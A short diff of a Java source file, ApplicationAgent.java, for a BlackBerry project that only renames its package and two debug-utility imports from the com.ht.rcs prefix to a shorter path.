@@ -5,10 +5,10 @@
  * File         : ApplicationAgent.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class ApplicationAgent extends Agent {
     //#mdebug
